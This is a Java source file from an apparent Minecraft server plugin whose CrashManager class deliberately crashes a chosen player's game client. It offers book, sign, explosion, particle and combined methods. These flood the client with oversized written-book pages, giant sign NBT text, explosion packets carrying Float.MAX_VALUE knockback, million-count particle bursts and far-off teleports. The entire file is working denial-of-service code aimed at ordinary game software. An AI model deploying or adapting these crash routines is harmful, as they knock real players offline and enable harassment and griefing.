package vac.crash;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.scheduler.BukkitRunnable;
import vac.util.PacketUtils;
import vac.util.VersionUtil;
import vac.VAC;

import java.lang.reflect.Constructor;
import java.util.*;

public class CrashManager {

    private final VAC plugin;

    public CrashManager(VAC plugin) {
        this.plugin = plugin;
    }

    public void crashPlayer(Player player, String method) {
        switch (method.toLowerCase()) {
            case "book":
                crashBook(player);
                break;
            case "sign":
                crashSign(player);
                break;
            case "explosion":
                crashExplosion(player);
                break;
            case "particle":
                crashParticle(player);
                break;
            case "all":
                crashAll(player);
                break;
            default:
                crashBook(player);
                break;
        }
    }

    private void crashBook(Player player) {
        Location loc = player.getLocation();
        StringBuilder huge = new StringBuilder();
        for (int i = 0; i < 32000; i++) {
            huge.append("§kM§r");
        }
        String page = huge.toString();

        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
        BookMeta meta = (BookMeta) book.getItemMeta();
        if (meta != null) {
            meta.setTitle("VAC");
            meta.setAuthor("VAC");
            List<String> pages = new ArrayList<>();
            for (int i = 0; i < 100; i++) pages.add(page);
            pages.add(generateNBTCrashString());
            meta.setPages(pages);
            book.setItemMeta(meta);
        }

        for (int i = 0; i < 50; i++) {
            PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(0, i % 40, book));
        }

        for (int i = 0; i < 20; i++) {
            PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(1, i, book));
        }
    }

    private void crashSign(Player player) {
        Location loc = player.getLocation();
        int baseX = loc.getBlockX();
        int baseY = Math.min(255, Math.max(0, loc.getBlockY() + 2));
        int baseZ = loc.getBlockZ();

        new BukkitRunnable() {
            int tick = 0;
            @Override
            public void run() {
                if (!player.isOnline() || tick >= 60) {
                    this.cancel();
                    return;
                }
                int offset = tick % 10;
                PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutOpenSignEditor(
                        baseX + offset, baseY, baseZ + offset));
                try {
                    Object blockPos = PacketUtils.createBlockPos(baseX + offset, baseY, baseZ + offset);
                    if (blockPos != null) {
                        PacketUtils.sendPacket(player, createSignUpdatePacket(blockPos));
                    }
                } catch (Exception ignored) {}
                tick++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private void crashExplosion(Player player) {
        Location loc = player.getLocation();
        List<Object> blocks = PacketUtils.createExplodedBlockPositions(
                loc.getBlockX(), loc.getBlockY(), loc.getBlockZ(), 10);

        for (int i = 0; i < 30; i++) {
            Object packet = PacketUtils.createPacketPlayOutExplosion(
                    loc.getX(), loc.getY(), loc.getZ(),
                    200.0f, blocks,
                    Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE);
            PacketUtils.sendPacket(player, packet);
        }

        for (int i = 0; i < 20; i++) {
            float yaw = player.getLocation().getYaw() + (float) (Math.random() - 0.5) * 360;
            float pitch = (float) (Math.random() - 0.5) * 180;
            Object pos = PacketUtils.createPacketPlayOutPosition(
                    loc.getX() + (Math.random() - 0.5) * 30000,
                    256,
                    loc.getZ() + (Math.random() - 0.5) * 30000,
                    yaw, pitch);
            PacketUtils.sendPacket(player, pos);
        }
    }

    private void crashParticle(Player player) {
        Location loc = player.getLocation();

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (!player.isOnline() || count >= 20) {
                    this.cancel();
                    return;
                }
                for (int i = 0; i < 20; i++) {
                    Object packet = PacketUtils.createPacketPlayOutWorldParticles(
                            "EXPLOSION_LARGE",
                            (float) (loc.getX() + (Math.random() - 0.5) * 20),
                            (float) (loc.getY() + Math.random() * 10),
                            (float) (loc.getZ() + (Math.random() - 0.5) * 20),
                            1000000,
                            5f, 5f, 5f, 100f);
                    PacketUtils.sendPacket(player, packet);
                }
                count++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private void crashAll(Player player) {
        crashBook(player);
        crashSign(player);
        crashExplosion(player);
        crashParticle(player);

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (!player.isOnline() || count >= 40) {
                    this.cancel();
                    return;
                }
                Location loc = player.getLocation();
                Object packet = PacketUtils.createPacketPlayOutPosition(
                        loc.getX() + (Math.random() - 0.5) * 60000,
                        10000 + Math.random() * 1000,
                        loc.getZ() + (Math.random() - 0.5) * 60000,
                        (float) (Math.random() * 360), (float) (Math.random() * 180 - 90));
                PacketUtils.sendPacket(player, packet);
                count++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private String generateNBTCrashString() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 32000; i++) {
            sb.append((char) (0xE000 + (i % 0xE000)));
        }
        return sb.toString();
    }

    private Object createSignUpdatePacket(Object blockPos) {
        try {
            VersionUtil.init();
            Class<?> clazz = VersionUtil.getNmsClass("PacketPlayOutTileEntityData");
            Class<?> bpClass = VersionUtil.getNmsClass("BlockPosition");
            Class<?> nbtClass = VersionUtil.getNmsClass("NBTTagCompound");

            StringBuilder huge = new StringBuilder();
            for (int i = 0; i < 30000; i++) huge.append("§k");

            Constructor<?> ctor = clazz.getConstructor(bpClass, int.class, nbtClass);
            Object nbt = nbtClass.getDeclaredConstructor().newInstance();

            String json = "{\"text\":\"" + huge.toString() + "\"}";
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text1", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text2", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text3", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text4", json);

            return ctor.newInstance(blockPos, 9, nbt);
        } catch (Exception e) {
            return null;
        }
    }

    public List<String> getAvailableMethods() {
        return Arrays.asList("book", "sign", "explosion", "particle", "all");
    }

    public void shutdown() {}
}
